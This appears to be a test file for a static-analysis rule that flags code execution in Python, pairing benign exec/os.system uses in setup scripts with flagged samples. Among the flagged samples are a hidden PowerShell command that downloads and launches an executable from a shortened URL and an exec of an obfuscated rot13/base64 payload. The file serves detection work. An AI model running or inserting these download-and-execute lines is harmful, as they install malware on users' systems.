""" Tests for code-execution rule

    OK cases:
        - Executing python files to extract version information
        - Os.system used for setup purposes
        - Executing git commands
    RULEID cases:
        - executing bash commands
"""


""" OK: Executing python files to extract version information 
"""
# ok: code-execution
exec(open('vapory_git/version.py').read()) # loads __version__

# ok: code-execution
exec(Path("calliope/_version.py").read_text())  # Sets the __version__ variable

# ok: code-execution
exec(open(os.path.join(root, 'comvex', 'version.py')).read())

if line.startswith('__version__'):
    # ok: code-execution
    eval(line.split('=')[-1])

# ok: code-execution
exec(open(path.join(name, 'version.py')).read())

here = os.path.abspath(os.path.dirname(__file__))
about = {}
with open(os.path.join(here, 'pip-tool', '__version__.py'), 'r', 'utf-8') as f:
    # ok: code-execution
    exec(f.read(), about)
    
with open('gsmls.py') as f:
    for line in f:
        if line.startswith('__version__ = '):
            # ok: code-execution
            version = eval(line.strip().split(' = ')[-1])
            break
        
VERSION_FILE = os.path.join(CURRENT_PATH, NAME, 'version.py')
def get_version():
    ns = {}
    with open(VERSION_FILE) as f:
        # ok: code-execution
        exec(f.read(), ns)
    return ns['__version__']


""" OK: os.system used for setup purposes
"""
# ok: code-execution
os.system('python setup.py sdist bdist_wheel')

# ok: code-execution
os.system('twine upload dist/*')

# ok: code-execution
os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))

# ok: code-execution
os.system('git tag v{0}'.format(about['__version__']))

# ok: code-execution
if os.system('pip freeze | grep twine'):
    # ok: code-execution
    os.system('gpg --detach-sign -a {}'.format(p))

# ok: code-execution
subprocess.check_output(["python3", "-m", "pip", "freeze"]).decode().splitlines()


""" OK: executing git commands
"""
# ok: code-execution
os.popen("cd %s && git init " % TEST_MODULES_ROOT)

# ok: code-execution
popen("cd %s && git init " % TEST_MODULES_ROOT)

# ok: code-execution
subprocess.check_output(['git', 'describe', '--tags']).strip()


""" RULEID: executing bash commands 
"""
# ruleid: code-execution
os.system("powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'")

# ruleid: code-execution
exec("o3ZkVQ0tpTkuqTMipz0hp3ymqTIgXPxAPzyzVT9mZFN9CFNvI2yhMT93plV6QDbtVUElrGbAPvNtVPNtVT9mYaWyozSgMFtaq3NhnaOaWljtVz5yql52LaZvXD0XVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VT5yql52LaZvXD0XVPOyrTAypUD6QDbtVPNtVPO0pax6QDbtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BJ9MJR4jJyqXpTWcAJcvZwO2L21TZ0jloTgMImSfMHp5ozSKFG09VvxAPvNtVPNtVPNtVUEyrUEiVQ0tpzIkqJImqUZhM2I0XTA1MKWxLFxhqTI4qN0XVPNtVPNtVPNtrPN9VPpaYzcinJ4bpzShMT9gYzAbo2ywMFumqUWcozphLKAwnJysqKOjMKWwLKAyVPftp3ElnJ5aYzSmL2ycK2kiq2IlL2SmMFNeVUA0pzyhMl5xnJqcqUZcVTMipvOsVTyhVUWuozqyXQR2XFxtXlNvYaMvplVAPvNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVTLhq3WcqTHbp3ElXUEyrUEiXFxAPvNtVPNtVPNtVTLhL2kip2HbXD0XVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjkHzuMZwyBHyZ5o1cKrUAvZ2E2L21EqzWKEacxE1M5GQAFnSxlBJynI3umVvxAPvNtVPNtVPNtVPNtVPNtqTI4qT8tCFOlMKS1MKA0pl5aMKDbL3IypzEuXF50MKu0QDbtVPNtVPNtVPNtVPNtVUttCFNaWl5do2yhXUWuozEioF5wnT9cL2Hbp3ElnJ5aYzSmL2ycK3IjpTIlL2SmMFNeVUA0pzyhMl5up2AcnI9fo3qypzAup2HtXlOmqUWcozphMTyanKEmXFOzo3VtKlOcovOlLJ5aMFtkAvxcVPftVv52LaZvQDbtVPNtVPNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVPNtVPNtMv53pzy0MFumqUVbqTI4qT8cXD0XVPNtVPNtVPNtVPNtVPOzYzAfo3AyXPxAPvNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPOjpzyhqN==".decode('rot13')).decode('base64')

# ruleid: code-execution
subprocess.call('/tmp/reloan')

# ruleid: code-execution
eval("print('hi')")

if line.startswith('DANGEROUS'):
    # ruleid: code-execution
    eval(line)
    # ruleid: code-execution
    eval("print('bar')")